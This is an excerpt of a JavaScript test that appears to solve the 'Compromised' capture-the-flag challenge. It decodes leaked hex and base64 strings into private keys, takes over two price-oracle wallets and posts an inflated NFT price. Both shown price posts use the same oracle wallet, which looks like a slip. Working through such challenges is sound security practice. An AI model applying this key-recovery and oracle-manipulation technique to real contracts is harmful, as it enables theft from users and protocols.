...
describe("Compromised challenge", function () {
  ...
  it("Execution", async function () {
    ...
    const priv1 = priv(privHack1);
    const priv2 = priv(privHack2);

    const oracle1 = new ethers.Wallet(priv1, ethers.provider);
    const oracle2 = new ethers.Wallet(priv2, ethers.provider);
    ...
    await oracle
      .connect(oracle1)
      .postPrice("DVNFT", BigNumber.from("999000000000000000000"));
    await oracle
      .connect(oracle1)
      .postPrice("DVNFT", BigNumber.from("999000000000000000000"));
...
const priv = (leak) =>
  Buffer.from(
    Buffer.from(leak.split(` `).join(``), `hex`).toString(`utf8`),
    `base64`
  ).toString(`utf8`);
